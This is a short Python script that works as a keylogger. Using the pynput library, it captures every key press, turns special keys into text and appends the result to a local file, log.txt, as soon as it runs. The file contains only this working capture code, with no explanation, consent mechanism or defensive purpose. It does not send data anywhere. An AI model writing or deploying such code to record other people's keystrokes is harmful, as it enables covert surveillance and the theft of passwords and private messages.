import pynput.keyboard

class SKL:
    def __init__(self):
        self.l = ''
    def append_to_l(self, keys):
        self.l += keys
        with open ('log.txt', 'a+', encoding='utf-8') as new_file:
            new_file.write(self.l)
        self.l = ''

    def eval_keys(self, key):
        try:
            Pressed = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed = ' '
            else:
                Pressed = ' ' + str(key) + ' '
        self.append_to_l(Pressed)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press = self.eval_keys)
        with keyboard_listener:
            self.l = ''
            keyboard_listener.join()
        
SKL().start()
